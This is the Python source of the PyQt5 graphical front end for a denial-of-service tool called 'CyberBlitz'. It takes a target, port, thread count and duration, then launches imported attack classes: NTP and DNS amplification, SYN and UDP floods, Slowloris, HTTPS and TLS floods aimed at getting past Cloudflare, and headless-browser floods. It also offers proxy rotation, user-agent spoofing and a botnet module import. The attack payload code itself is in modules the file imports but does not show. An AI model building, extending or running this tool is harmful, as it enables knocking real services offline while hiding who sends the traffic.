import sys
import os
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QGridLayout, QLineEdit, QPushButton, QSpinBox, QComboBox,
    QRadioButton, QCheckBox, QLabel, QPlainTextEdit, QProgressBar,
    QGroupBox, QDialog, QMessageBox, QDoubleSpinBox, QSplitter,
    QTabWidget, QStatusBar, QFileDialog
)
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtGui import QFont
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
import plotly.graph_objects as go

# Import existing CyberBlitz modules
from config import update_config, CONFIG, setup_logging, logger
from attacks.layer4 import *
from attacks.layer7 import BrowserAttack, TLSAttack, HTTPAttack, get_locust_attack
from attacks.botnet import *
from utils.proxy import load_proxies_from_file
from utils.spoofing import load_user_agents_from_file
from gui_advanced import AdvancedSettingsDialog
from gui_dialogs import HeaderPoolsDialog, UserAgentMatrixDialog, HeaderConfigDialog
from gui_constants import ATTACK_METHODS
from gui_themes import apply_theme
import asyncio
import time
import logging
import threading
import json
import random

class GuiLogHandler(QObject, logging.Handler):
    log_signal = pyqtSignal(str, str)
    def __init__(self):
        QObject.__init__(self)
        logging.Handler.__init__(self)
        self.setLevel(logging.DEBUG)
    def emit(self, record):
        message = self.format(record)
        self.log_signal.emit(message, record.levelname)

class AttackWorker(QThread):
    progress_updated = pyqtSignal(int)
    attack_finished = pyqtSignal()
    metrics_updated = pyqtSignal(dict)
    
    def __init__(self, attack_params):
        super().__init__()
        self.attack_params = attack_params
        self.is_running = True
        self.attack_instance = None
    
    def run(self):
        duration = self.attack_params['duration']
        method = self.attack_params['method']
        
        update_config(**self.attack_params)
        
        if isinstance(CONFIG.get('proxy_list'), list):
            CONFIG['proxies'] = CONFIG['proxy_list']
        
        attack_methods = {
            'NTP': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'NTP', CONFIG['duration']),
            'DNS': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'DNS', CONFIG['duration']),
            'TCP-SYN': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-SYN', CONFIG['duration']),
            'UDP': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP', CONFIG['duration']),
            'SLOWLORIS': lambda: SlowLorisAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], 'SLOWLORIS', num_sockets=CONFIG['threads']),
            'HTTPS-FLOODER': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-FLOODER'),
            'CF-TLS': lambda: TLSAttack(CONFIG['target_url'], CONFIG['duration'], 'CF-TLS'),
            'HTTP-BROWSER': lambda: BrowserAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTP-BROWSER', behaviors=self.attack_params.get('behaviors', [])),
            'LOCUST-HTTP': lambda: get_locust_attack()(CONFIG['target_url'], CONFIG['duration'], 'LOCUST-HTTP')
        }
        # Add all other methods dynamically
        for layer, categories in ATTACK_METHODS.items():
            for category, methods in categories.items():
                for m in methods:
                    if m not in attack_methods:
                        if layer == 'L4':
                            if category == 'AMP':
                                attack_methods[m] = lambda m=m: AMPAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration'])
                            elif category == 'TCP':
                                attack_methods[m] = lambda m=m: TCPAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration'])
                            elif category == 'UDP':
                                attack_methods[m] = lambda m=m: UDPAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration'])
                        # Add other L7 attacks if necessary

        logger.info(f"Запуск {method} атаки...")
        start_time = time.time()
        try:
            self.attack_instance = attack_methods[method]()
            attack_thread = threading.Thread(target=self.run_attack_logic)
            attack_thread.start()
            
            while self.is_running and (time.time() - start_time < duration):
                elapsed = int(time.time() - start_time)
                self.progress_updated.emit(int((elapsed / duration) * 100))
                time.sleep(1)
            
            self.stop()
            attack_thread.join(timeout=5)
            self.progress_updated.emit(100)
            logger.info("Атака завершена.")
        except Exception as e:
            logger.error(f"Ошибка при выполнении атаки: {e}")
        finally:
            self.attack_finished.emit()
            
    def run_attack_logic(self):
        try:
            if asyncio.iscoroutinefunction(self.attack_instance.run):
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self.attack_instance.run())
            else:
                self.attack_instance.run()
        except Exception as e:
            logger.error(f"Ошибка в потоке атаки: {e}")
            
    def stop(self):
        if not self.is_running: return
        self.is_running = False
        if self.attack_instance and hasattr(self.attack_instance, 'stop'):
            self.attack_instance.stop()
        self.wait()

class CyberBlitzGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CyberBlitz")
        self.setGeometry(100, 100, 850, 750)
        
        self.attack_thread = None
        self.gui_log_handler = GuiLogHandler()
        self.loaded_proxies = []
        self.time_points, self.rps_points, self.latency_points = [], [], []
        
        self.init_ui()
        self.setup_logging()
        self.update_method_options()
        self.toggle_browser_options()
        self.toggle_ua_file_input(0)

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        tab_widget = QTabWidget()
        tab_widget.addTab(self.create_attack_tab(), "Атака")
        tab_widget.addTab(self.create_network_tab(), "Сеть и Спуфинг")
        tab_widget.addTab(self.create_graph_tab(), "График")
        main_layout.addWidget(tab_widget)

        self.log_output = QPlainTextEdit()
        self.log_output.setReadOnly(True)
        main_layout.addWidget(self.log_output)

        bottom_layout = QHBoxLayout()
        self.progress_bar = QProgressBar()
        bottom_layout.addWidget(self.progress_bar)
        main_layout.addLayout(bottom_layout)

        button_layout = QHBoxLayout()
        self.stop_button = QPushButton("STOP"); self.stop_button.setEnabled(False)
        self.start_button = QPushButton("START")
        self.stop_button.clicked.connect(self.stop_attack)
        self.start_button.clicked.connect(self.start_attack)
        button_layout.addStretch(); button_layout.addWidget(self.stop_button); button_layout.addWidget(self.start_button)
        main_layout.addLayout(button_layout)
        
        self.setStatusBar(QStatusBar(self))

    def create_attack_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        params_group = QGroupBox("Основные параметры")
        params_layout = QGridLayout(params_group)

        params_layout.addWidget(QLabel("Target:"), 0, 0); self.target_input = QLineEdit("127.0.0.1"); params_layout.addWidget(self.target_input, 0, 1)
        params_layout.addWidget(QLabel("Port:"), 0, 2); self.port_input = QSpinBox(); self.port_input.setRange(1, 65535); self.port_input.setValue(80); params_layout.addWidget(self.port_input, 0, 3)
        
        self.l4_radio = QRadioButton("L4"); self.l7_radio = QRadioButton("L7"); self.l4_radio.setChecked(True)
        self.l4_radio.toggled.connect(self.update_method_options)
        params_layout.addWidget(self.l4_radio, 1, 0); params_layout.addWidget(self.l7_radio, 1, 1)

        params_layout.addWidget(QLabel("Method:"), 2, 0); self.method_combo = QComboBox(); self.method_combo.currentIndexChanged.connect(self.toggle_browser_options); params_layout.addWidget(self.method_combo, 2, 1, 1, 3)
        params_layout.addWidget(QLabel("Threads:"), 3, 0); self.threads_input = QSpinBox(); self.threads_input.setRange(1, 1000); self.threads_input.setValue(100); params_layout.addWidget(self.threads_input, 3, 1)
        params_layout.addWidget(QLabel("Duration (s):"), 3, 2); self.duration_input = QSpinBox(); self.duration_input.setRange(1, 3600); self.duration_input.setValue(60); params_layout.addWidget(self.duration_input, 3, 3)
        
        layout.addWidget(params_group)
        return tab

    def create_network_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        client_group = QGroupBox("Client Spoofing")
        client_layout = QGridLayout(client_group)
        self.browser_label = QLabel("Browser:"); client_layout.addWidget(self.browser_label, 1, 0)
        self.browser_combo = QComboBox(); self.browser_combo.addItems(["playwright", "selenium"]); client_layout.addWidget(self.browser_combo, 1, 1)
        self.clicks_checkbox = QCheckBox("Clicks"); client_layout.addWidget(self.clicks_checkbox, 2, 0)
        self.scroll_checkbox = QCheckBox("Scroll"); client_layout.addWidget(self.scroll_checkbox, 2, 1)
        layout.addWidget(client_group)

        ua_group = QGroupBox("User-Agent Source")
        ua_layout = QGridLayout(ua_group)
        self.ua_source_combo = QComboBox(); self.ua_source_combo.addItems(["Generate Automatically", "Load from File"]); self.ua_source_combo.currentIndexChanged.connect(self.toggle_ua_file_input); ua_layout.addWidget(self.ua_source_combo, 0, 0, 1, 2)
        self.ua_file_input = QLineEdit(); self.ua_file_input.setPlaceholderText("Path to user_agents.txt"); ua_layout.addWidget(self.ua_file_input, 1, 0)
        self.load_ua_button = QPushButton("Browse..."); self.load_ua_button.clicked.connect(self.handle_load_user_agents); ua_layout.addWidget(self.load_ua_button, 1, 1)
        layout.addWidget(ua_group)

        anon_group = QGroupBox("Anonymity & Routing")
        anon_layout = QGridLayout(anon_group)
        self.use_proxy_checkbox = QCheckBox("Use Proxy"); anon_layout.addWidget(self.use_proxy_checkbox, 1, 0)
        self.load_proxy_button = QPushButton("Load from File"); self.load_proxy_button.clicked.connect(self.handle_load_proxies); anon_layout.addWidget(self.load_proxy_button, 3, 0, 1, 2)
        layout.addWidget(anon_group)
        
        return tab

    def create_graph_tab(self):
        tab = QWidget(); layout = QVBoxLayout(tab); self.graph_view = QWebEngineView(); layout.addWidget(self.graph_view); self.update_graph(); return tab

    def update_graph(self, metrics=None):
        if metrics:
            self.time_points.append(len(self.time_points))
            self.rps_points.append(metrics.get('requests_per_second', 0))
            self.latency_points.append(metrics.get('latency', 0))
        html = go.Figure(data=[go.Scatter(x=self.time_points, y=self.rps_points, name='RPS'), go.Scatter(x=self.time_points, y=self.latency_points, name='Latency', yaxis='y2')]).update_layout(template='plotly_dark', yaxis2=dict(overlaying='y', side='right')).to_html(full_html=False, include_plotlyjs='cdn')
        self.graph_view.setHtml(html)

    def toggle_ua_file_input(self, index):
        is_file = self.ua_source_combo.currentText() == "Load from File"
        self.ua_file_input.setVisible(is_file)
        self.load_ua_button.setVisible(is_file)

    def handle_load_user_agents(self):
        filePath, _ = QFileDialog.getOpenFileName(self, "Open User-Agents File", "", "Text Files (*.txt)")
        if filePath: self.ua_file_input.setText(filePath)

    def handle_load_proxies(self):
        filePath, _ = QFileDialog.getOpenFileName(self, "Open Proxy File", "", "Text Files (*.txt)")
        if filePath:
            self.loaded_proxies = load_proxies_from_file(filePath, 'http') # Assuming http, should be configurable
            if self.loaded_proxies: logger.info(f"Loaded {len(self.loaded_proxies)} proxies.")
            else: logger.warning("Failed to load proxies.")

    def setup_logging(self):
        self.gui_log_handler.log_signal.connect(self.handle_log_message)
        setup_logging(level=logging.INFO, console=False, file_logging=True)
        logging.getLogger().addHandler(self.gui_log_handler)

    def update_method_options(self):
        self.method_combo.clear()
        layer = 'L4' if self.l4_radio.isChecked() else 'L7'
        methods = [m for cat in ATTACK_METHODS[layer].values() for m in cat]
        self.method_combo.addItems(methods)

    def toggle_browser_options(self):
        is_browser = self.method_combo.currentText() in ['HTTP-BROWSER']
        self.browser_label.setVisible(is_browser); self.browser_combo.setVisible(is_browser)
        self.clicks_checkbox.setVisible(is_browser); self.scroll_checkbox.setVisible(is_browser)
            
    def start_attack(self):
        if self.attack_thread and self.attack_thread.isRunning(): return
        if self.l4_radio.isChecked() and hasattr(os, 'geteuid') and os.geteuid() != 0:
            QMessageBox.critical(self, "Error", "L4 attacks require root privileges.")
            return

        spoofing_opts = {}
        if self.ua_source_combo.currentText() == "Load from File":
            ua_file = self.ua_file_input.text()
            if ua_file:
                user_agents = load_user_agents_from_file(ua_file)
                if user_agents:
                    spoofing_opts['user_agent_source'] = 'file'
                    CONFIG['user_agents_list'] = user_agents
            else:
                QMessageBox.warning(self, "Warning", "User-Agent source is file, but no file path is provided.")
                return
        CONFIG['spoofing'] = {**CONFIG.get('spoofing', {}), **spoofing_opts}

        attack_params = {
            'target_ip': self.target_input.text(), 'target_url': self.target_input.text(),
            'port': self.port_input.value(), 'method': self.method_combo.currentText(),
            'threads': self.threads_input.value(), 'duration': self.duration_input.value(),
            'use_proxy': self.use_proxy_checkbox.isChecked(), 'proxy_list': self.loaded_proxies,
            'behaviors': [b for b, c in [('clicks', self.clicks_checkbox), ('scroll', self.scroll_checkbox)] if c.isChecked()]
        }
        
        self.start_button.setEnabled(False); self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0); self.log_output.clear()
        self.time_points.clear(); self.rps_points.clear(); self.latency_points.clear(); self.update_graph()
        
        self.attack_thread = AttackWorker(attack_params)
        self.attack_thread.progress_updated.connect(self.progress_bar.setValue)
        self.attack_thread.attack_finished.connect(self.on_attack_finished)
        self.attack_thread.metrics_updated.connect(self.update_graph)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread: self.attack_thread.stop()
            
    def on_attack_finished(self):
        self.start_button.setEnabled(True); self.stop_button.setEnabled(False)
        self.progress_bar.setValue(100); self.attack_thread = None
        
    def handle_log_message(self, message, level):
        self.log_output.appendPlainText(f"[{level}] {message.strip()}")

    def closeEvent(self, event):
        self.stop_attack()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    apply_theme(app)
    window = CyberBlitzGUI()
    window.show()
    sys.exit(app.exec_())